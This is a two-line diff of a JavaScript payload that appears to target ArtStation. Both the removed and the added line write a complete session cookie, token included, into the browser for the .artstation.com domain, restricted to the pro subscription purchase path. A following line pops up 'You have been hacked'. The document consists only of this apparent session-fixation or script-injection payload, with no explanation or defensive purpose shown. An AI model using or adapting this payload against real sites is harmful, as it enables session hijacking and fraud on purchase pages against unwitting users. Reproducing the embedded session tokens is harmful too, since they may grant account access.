@@ -1,2 +1,2 @@
-document.cookie=`ArtStationSessionCookie=ImZhNDM4MTRhLWJkMTMtNDkwYy04YmMzLTM0ZmVmZDU5NGE2YyI%3D--5997f1b0bcb99a661ca8eb87be6bcea87489277ffe453a9587647b9b34e926ca; Path=/subscriptions/purchase/pro; Domain=.artstation.com`;
+document.cookie=`ArtStationSessionCookie=IjM1YWJjYmUzLWM2YjgtNGI0NS1iZDI2LWJkZjMyZWU5NjI2MSI%3D--68e49d4f4a0e793608ee2b5743cef63392be199027889d2b127c216f8f1fc11c; Path=/subscriptions/purchase/pro; Domain=.artstation.com`;
 alert("You have been hacked");
